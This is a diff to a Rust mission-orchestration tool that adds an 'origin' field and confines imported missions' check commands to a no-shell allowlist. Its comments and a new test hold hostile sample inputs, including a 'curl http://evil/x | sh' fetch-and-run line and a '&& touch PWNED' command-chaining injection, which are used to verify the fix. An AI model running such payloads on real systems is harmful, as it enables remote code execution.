@@ -351,6 +351,12 @@ struct MissionRow {
     // v2.16 PR-4: worker config JSON — {"runtime":"...","model":null|"...","require_tools":[...]}.
     // NULL means the coordinator tick will escalate with reason="no_worker_config".
     worker_config: Option<serde_json::Value>,
+    // SECURITY (#49 fix): provenance of this mission. "manual" = authored
+    // locally by the operator (trusted → check_commands may use `sh -c`).
+    // Anything else (e.g. "imported" from a team share) is untrusted → its
+    // check_commands are confined to the no-shell allowlist. Gating is
+    // fail-closed: only the exact string "manual" is treated as trusted.
+    origin: String,
 }
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
@@ -367,11 +373,11 @@ struct MissionEventRow {
 //   6=workspace_strategy 7=base_sha 8=cleanup_policy 9=merge_strategy
 //   10=category 11=state 12=max_loops 13=token_budget_usd 14=result_metadata
 //   15=narrative_md_path 16=created_at 17=updated_at 18=repo_root (PR-3)
-//   19=worker_config (PR-4, last)
+//   19=worker_config (PR-4) 20=origin (#49 fix, last)
 const MISSION_SELECT: &str = "SELECT id, slug, name, goal, success_criteria, escalation_policy,
             workspace_strategy, base_sha, cleanup_policy, merge_strategy,
             category, state, max_loops, token_budget_usd, result_metadata,
-            narrative_md_path, created_at, updated_at, repo_root, worker_config FROM missions";
+            narrative_md_path, created_at, updated_at, repo_root, worker_config, origin FROM missions";
 
 // ── Validation constants ──────────────────────────────────────────────
 
@@ -585,12 +591,18 @@ fn run_create(input: CreateInput, db_path: &PathBuf, opts: &Opts) -> Result<()> 
         .context("serialize escalation_policy")?;
 
     conn.execute(
+        // SECURITY (#49 fix): `origin = 'manual'` marks this mission as
+        // operator-authored on THIS machine, which is what permits its
+        // check_commands to run through `sh -c`. Any path that ingests a
+        // mission from elsewhere (e.g. a future team-shared import) MUST
+        // write a non-'manual' origin so its check_commands are confined to
+        // the no-shell allowlist in execute_check_command().
         "INSERT INTO missions (
             id, slug, name, goal, success_criteria, escalation_policy,
             workspace_strategy, base_sha, cleanup_policy, merge_strategy,
             category, state, max_loops, token_budget_usd, result_metadata,
-            narrative_md_path, created_at, updated_at, repo_root
-        ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, 'open', ?12, ?13, NULL, ?14, ?15, ?15, ?16)",
+            narrative_md_path, created_at, updated_at, repo_root, origin
+        ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, 'open', ?12, ?13, NULL, ?14, ?15, ?15, ?16, 'manual')",
         params![
             id,
             slug,
@@ -1544,6 +1556,11 @@ fn row_to_mission(r: &rusqlite::Row) -> rusqlite::Result<MissionRow> {
         updated_at: r.get(17)?,
         repo_root: r.get(18).ok().flatten(), // PR-3: .ok().flatten() tolerates old rows without it
         worker_config,
+        // SECURITY (#49 fix): default a missing/unreadable origin to "imported"
+        // (untrusted), NOT "manual" — fail closed. Real local rows are
+        // backfilled to "manual" by the ALTER migration, so this default only
+        // bites on a corrupt/partial read, where untrusted is the safe answer.
+        origin: r.get::<_, String>(20).unwrap_or_else(|_| "imported".to_string()),
     })
 }
 
@@ -2372,11 +2389,86 @@ fn check_merge_strategy_gate(mission: &MissionRow, want_all: bool) -> Result<()>
     }
 }
 
-/// Run all success_criteria check_commands in `work_dir` (no-shell argv split).
-/// Returns (all_met, results_json).
+/// SECURITY (#49 fix): the allowlist of programs an UNTRUSTED (e.g.
+/// team-shared / imported) mission's check_command may invoke. Deliberately
+/// excludes anything that can spawn a subshell or interpret arbitrary code
+/// (sh, bash, zsh, env, python, node, perl, ruby, make, xargs, find, awk, …)
+/// — read-only-ish verification tools only. We also reject any program that
+/// contains a path separator, so an attacker can't smuggle in `/tmp/evil`
+/// renamed to a whitelisted name; the bare name is resolved via PATH.
+fn is_allowed_untrusted_check_program(program: &str) -> bool {
+    if program.contains('/') || program.contains('\\') {
+        return false;
+    }
+    matches!(
+        program,
+        "test"
+            | "["
+            | "true"
+            | "false"
+            | "ls"
+            | "cat"
+            | "grep"
+            | "egrep"
+            | "fgrep"
+            | "rg"
+            | "head"
+            | "tail"
+            | "wc"
+            | "diff"
+            | "cmp"
+            | "stat"
+            | "file"
+            | "echo"
+            | "basename"
+            | "dirname"
+    )
+}
+
+/// Execute a single check_command in `work_dir` and return its exit code
+/// (-1 on empty / unparseable / disallowed / spawn failure).
+///
+/// SECURITY (#49 fix): `trusted` missions (origin = "manual" — authored
+/// locally by the operator) keep the QA-requested `sh -c` ergonomics: pipes,
+/// `&&`, `$(...)` all work. UNTRUSTED missions (any other origin, e.g. a
+/// team-shared mission imported from another user) must NEVER reach a shell —
+/// their check_command is split into argv with no shell interpretation and the
+/// program must pass `is_allowed_untrusted_check_program`. Without this split,
+/// a shared mission could carry `{"check_command":"curl evil|sh"}` and run on
+/// the victim's `ato missions tick`.
+fn execute_check_command(check_cmd: &str, work_dir: &Path, trusted: bool) -> i32 {
+    if check_cmd.trim().is_empty() {
+        return -1;
+    }
+    let run = |cmd: &mut std::process::Command| -> i32 {
+        cmd.current_dir(work_dir)
+            .stdin(std::process::Stdio::null())
+            .stdout(std::process::Stdio::null())
+            .stderr(std::process::Stdio::null())
+            .status()
+            .map(|s| s.code().unwrap_or(-1))
+            .unwrap_or(-1)
+    };
+    if trusted {
+        return run(std::process::Command::new("sh").arg("-c").arg(check_cmd));
+    }
+    // Untrusted: no shell. Quote-aware split, then enforce the allowlist.
+    let argv = match shlex::split(check_cmd) {
+        Some(v) if !v.is_empty() => v,
+        _ => return -1,
+    };
+    if !is_allowed_untrusted_check_program(&argv[0]) {
+        return -1;
+    }
+    run(std::process::Command::new(&argv[0]).args(&argv[1..]))
+}
+
+/// Run all success_criteria check_commands in `work_dir`. `trusted` selects the
+/// execution model (see execute_check_command). Returns (all_met, results_json).
 fn run_checks_in_dir(
     criteria: &[serde_json::Value],
     work_dir: &Path,
+    trusted: bool,
 ) -> (bool, Vec<serde_json::Value>) {
     let mut results = Vec::new();
     for criterion in criteria {
@@ -2391,24 +2483,7 @@ fn run_checks_in_dir(
             .unwrap_or("")
             .to_string();
 
-        // QA-found 2026-06-13: run check_command via `sh -c` so users can
-        // write natural shell expressions (pipes, &&, $(...)). check_command
-        // is trusted mission-config — distinct from the PR-1.5 LLM-callable
-        // `bash` tool which IS parsed argv with an allowlist.
-        if check_cmd.trim().is_empty() {
-            results.push(serde_json::json!({"description": desc, "exit_code": -1, "met": false}));
-            continue;
-        }
-        let exit_code = std::process::Command::new("sh")
-            .arg("-c")
-            .arg(&check_cmd)
-            .current_dir(work_dir)
-            .stdin(std::process::Stdio::null())
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .status()
-            .map(|s| s.code().unwrap_or(-1))
-            .unwrap_or(-1);
+        let exit_code = execute_check_command(&check_cmd, work_dir, trusted);
         results.push(serde_json::json!({
             "description": desc,
             "exit_code": exit_code,
@@ -2593,7 +2668,7 @@ fn approve_one_agent(
 
     // Run ALL success_criteria check_commands in the integration worktree.
     let criteria = mission.success_criteria.as_array().cloned().unwrap_or_default();
-    let (all_met, check_results) = run_checks_in_dir(&criteria, int_path);
+    let (all_met, check_results) = run_checks_in_dir(&criteria, int_path, mission.origin == "manual");
 
     // Record merge_check event.
     let now = chrono::Utc::now().to_rfc3339();
@@ -2727,7 +2802,7 @@ fn finish_gate(
             mission.slug, criteria.len(),
         );
     }
-    let (all_met, results) = run_checks_in_dir(&criteria, int_path);
+    let (all_met, results) = run_checks_in_dir(&criteria, int_path, mission.origin == "manual");
     insert_event(
         conn,
         &mission.id,
@@ -4015,27 +4090,13 @@ fn run_success_evaluation(
             continue;
         }
 
-        // QA-found 2026-06-13: run check_command via `sh -c` so users can
-        // write natural shell expressions (pipes, &&, $(...)). check_command
-        // is trusted mission-config (same threat model as crontab) — this is
-        // distinct from the PR-1.5 LLM-callable `bash` tool which IS parsed
-        // argv with an allowlist because the LLM is untrusted. Previously the
-        // raw-argv split meant `head -1 X | grep -q Y` failed because `|`
-        // was passed as a literal arg.
-        if check_cmd.trim().is_empty() {
-            results.push(CriterionResult { description: desc, exit_code: -1, met: false });
-            continue;
-        }
-        let exit_code = std::process::Command::new("sh")
-            .arg("-c")
-            .arg(&check_cmd)
-            .current_dir(&work_dir)
-            .stdin(std::process::Stdio::null())
-            .stdout(std::process::Stdio::null())
-            .stderr(std::process::Stdio::null())
-            .status()
-            .map(|s| s.code().unwrap_or(-1))
-            .unwrap_or(-1);
+        // SECURITY (#49 fix): trusted (origin="manual") missions keep the
+        // QA-requested `sh -c` ergonomics (pipes, &&, $(...)); untrusted /
+        // imported missions are confined to the no-shell allowlist. See
+        // execute_check_command. `head -1 X | grep -q Y` still works for
+        // operator-authored missions.
+        let exit_code =
+            execute_check_command(&check_cmd, &work_dir, mission.origin == "manual");
 
         results.push(CriterionResult {
             description: desc,
@@ -4515,7 +4576,8 @@ mod tests {
                 created_at          TEXT NOT NULL,
                 updated_at          TEXT NOT NULL,
                 repo_root           TEXT,
-                worker_config       TEXT
+                worker_config       TEXT,
+                origin              TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id              TEXT PRIMARY KEY,
@@ -5210,7 +5272,7 @@ mod tests {
                 category TEXT NOT NULL DEFAULT 'autonomous', state TEXT NOT NULL DEFAULT 'open',
                 max_loops INTEGER, token_budget_usd REAL, result_metadata TEXT,
                 narrative_md_path TEXT NOT NULL, created_at TEXT NOT NULL,
-                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT
+                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT, origin TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id TEXT PRIMARY KEY, mission_id TEXT NOT NULL,
@@ -5300,7 +5362,7 @@ mod tests {
                 category TEXT NOT NULL DEFAULT 'autonomous', state TEXT NOT NULL DEFAULT 'open',
                 max_loops INTEGER, token_budget_usd REAL, result_metadata TEXT,
                 narrative_md_path TEXT NOT NULL, created_at TEXT NOT NULL,
-                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT
+                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT, origin TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id TEXT PRIMARY KEY, mission_id TEXT NOT NULL,
@@ -5379,7 +5441,7 @@ mod tests {
                 category TEXT NOT NULL DEFAULT 'autonomous', state TEXT NOT NULL DEFAULT 'open',
                 max_loops INTEGER, token_budget_usd REAL, result_metadata TEXT,
                 narrative_md_path TEXT NOT NULL, created_at TEXT NOT NULL,
-                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT
+                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT, origin TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id TEXT PRIMARY KEY, mission_id TEXT NOT NULL,
@@ -5911,7 +5973,7 @@ mod tests {
                 category TEXT NOT NULL DEFAULT 'autonomous', state TEXT NOT NULL DEFAULT 'open',
                 max_loops INTEGER, token_budget_usd REAL, result_metadata TEXT,
                 narrative_md_path TEXT NOT NULL, created_at TEXT NOT NULL,
-                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT
+                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT, origin TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id TEXT PRIMARY KEY, mission_id TEXT NOT NULL,
@@ -5986,7 +6048,7 @@ mod tests {
                 category TEXT NOT NULL DEFAULT 'autonomous', state TEXT NOT NULL DEFAULT 'open',
                 max_loops INTEGER, token_budget_usd REAL, result_metadata TEXT,
                 narrative_md_path TEXT NOT NULL, created_at TEXT NOT NULL,
-                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT
+                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT, origin TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id TEXT PRIMARY KEY, mission_id TEXT NOT NULL,
@@ -6092,7 +6154,7 @@ mod tests {
                 category TEXT NOT NULL DEFAULT 'autonomous', state TEXT NOT NULL DEFAULT 'open',
                 max_loops INTEGER, token_budget_usd REAL, result_metadata TEXT,
                 narrative_md_path TEXT NOT NULL, created_at TEXT NOT NULL,
-                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT
+                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT, origin TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id TEXT PRIMARY KEY, mission_id TEXT NOT NULL,
@@ -6226,7 +6288,7 @@ mod tests {
                 category TEXT NOT NULL DEFAULT 'autonomous', state TEXT NOT NULL DEFAULT 'open',
                 max_loops INTEGER, token_budget_usd REAL, result_metadata TEXT,
                 narrative_md_path TEXT NOT NULL, created_at TEXT NOT NULL,
-                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT
+                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT, origin TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id TEXT PRIMARY KEY, mission_id TEXT NOT NULL,
@@ -6465,6 +6527,7 @@ mod tests {
         let (all_met_pipe, results_pipe) = run_checks_in_dir(
             pipe_check.as_array().unwrap().as_slice(),
             tmp.path(),
+            true, // trusted (origin="manual") → sh -c
         );
         assert!(all_met_pipe, "pipe check must pass: {:?}", results_pipe);
 
@@ -6476,6 +6539,7 @@ mod tests {
         let (all_met_and, results_and) = run_checks_in_dir(
             and_check.as_array().unwrap().as_slice(),
             tmp.path(),
+            true,
         );
         assert!(all_met_and, "&& check must pass: {:?}", results_and);
 
@@ -6484,6 +6548,7 @@ mod tests {
         let (all_met_fail, _) = run_checks_in_dir(
             pipe_check.as_array().unwrap().as_slice(),
             tmp.path(),
+            true,
         );
         assert!(!all_met_fail, "non-matching content must fail");
 
@@ -6496,8 +6561,72 @@ mod tests {
         let (all_met_simple, _) = run_checks_in_dir(
             simple.as_array().unwrap().as_slice(),
             tmp.path(),
+            true,
         );
         assert!(all_met_simple, "test -f baseline must still pass");
+    }
+
+    /// SECURITY (#49 fix): an UNTRUSTED mission (origin != "manual") must not
+    /// reach a shell. Shell-injection payloads are neutralized: the metachars
+    /// are never interpreted, and non-allowlisted / interpreter programs are
+    /// refused outright (exit -1, never "met").
+    #[test]
+    fn untrusted_check_command_is_confined_to_no_shell_allowlist() {
+        let tmp = tempfile::TempDir::new().unwrap();
+        std::fs::write(tmp.path().join("team-goal.txt"), b"done\n").unwrap();
+
+        // RCE attempt: a shared mission tries to pipe into a shell. Under the
+        // untrusted path there is no shell, so `|` and friends are literal; and
+        // `curl`/`sh` aren't on the allowlist anyway → refused.
+        let rce = serde_json::json!([{
+            "description": "pwn",
+            "check_command": "curl http://evil/x | sh"
+        }]);
+        let (met, results) =
+            run_checks_in_dir(rce.as_array().unwrap().as_slice(), tmp.path(), false);
+        assert!(!met, "untrusted RCE payload must NOT be met: {:?}", results);
+
+        // Even a shell builtin spelled out is refused (sh not on allowlist).
+        let shell = serde_json::json!([{
+            "description": "shell",
+            "check_command": "sh -c 'echo hi'"
+        }]);
+        let (met_sh, _) =
+            run_checks_in_dir(shell.as_array().unwrap().as_slice(), tmp.path(), false);
+        assert!(!met_sh, "untrusted `sh -c` must be refused");
+
+        // No shell side-effects: a payload that WOULD chain a second command
+        // under a shell (`&& touch PWNED`) must not create the sentinel — there
+        // is no shell to interpret `&&`, and `touch` isn't on the allowlist.
+        // (The metachars become literal args to the allowlisted `test`.)
+        let sentinel = tmp.path().join("PWNED");
+        let inject = serde_json::json!([{
+            "description": "no shell chaining",
+            "check_command": "test -f team-goal.txt && touch PWNED"
+        }]);
+        let _ = run_checks_in_dir(inject.as_array().unwrap().as_slice(), tmp.path(), false);
+        assert!(
+            !sentinel.exists(),
+            "untrusted check must not chain a second command via shell"
+        );
+
+        // A plain allowlisted check with no shell features still works untrusted.
+        let ok = serde_json::json!([{
+            "description": "file exists",
+            "check_command": "test -f team-goal.txt"
+        }]);
+        let (met_ok, _) =
+            run_checks_in_dir(ok.as_array().unwrap().as_slice(), tmp.path(), false);
+        assert!(met_ok, "allowlisted no-shell check must still pass untrusted");
+
+        // Path-qualified program is refused even if basename is allowlisted.
+        let pathy = serde_json::json!([{
+            "description": "path escape",
+            "check_command": "/bin/test -f team-goal.txt"
+        }]);
+        let (met_pathy, _) =
+            run_checks_in_dir(pathy.as_array().unwrap().as_slice(), tmp.path(), false);
+        assert!(!met_pathy, "path-qualified program must be refused untrusted");
     }
 
     #[test]
@@ -6536,7 +6665,7 @@ mod tests {
                 category TEXT NOT NULL DEFAULT 'autonomous', state TEXT NOT NULL DEFAULT 'open',
                 max_loops INTEGER, token_budget_usd REAL, result_metadata TEXT,
                 narrative_md_path TEXT NOT NULL, created_at TEXT NOT NULL,
-                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT
+                updated_at TEXT NOT NULL, repo_root TEXT, worker_config TEXT, origin TEXT NOT NULL DEFAULT 'manual'
             );
             CREATE TABLE mission_events (
                 id TEXT PRIMARY KEY, mission_id TEXT NOT NULL,
